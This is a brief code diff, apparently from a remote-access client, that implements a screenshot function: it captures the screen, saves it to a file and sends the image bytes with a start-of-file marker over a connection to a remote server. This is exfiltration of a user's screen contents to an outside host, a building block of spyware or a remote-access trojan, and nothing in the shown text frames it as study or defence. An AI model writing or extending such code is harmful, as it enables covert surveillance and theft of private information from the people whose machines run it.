@@ -8,7 +8,13 @@ _server = remote(server_addr, server_port)
 # server.connect((server_addr, server_port))
 
 def _screen():
-    pass
+    capscreen = screenshot()
+    capscreen.save("pic.png")
+    bytestream = open("pic.png", "rb").read()
+    _server.send(b"\xfe\xdf\x10\x02START_OF_FILE")
+    _server.send(bytestream)
+    return
+
 
 def _file():
     pass
